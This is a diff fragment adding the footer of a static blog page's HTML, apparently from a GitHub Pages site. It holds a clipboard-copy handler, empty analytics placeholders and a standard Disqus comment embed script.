+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'jiravvit-github-io';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+<!-- utterances Comments -->
+
+</body>
+</html>
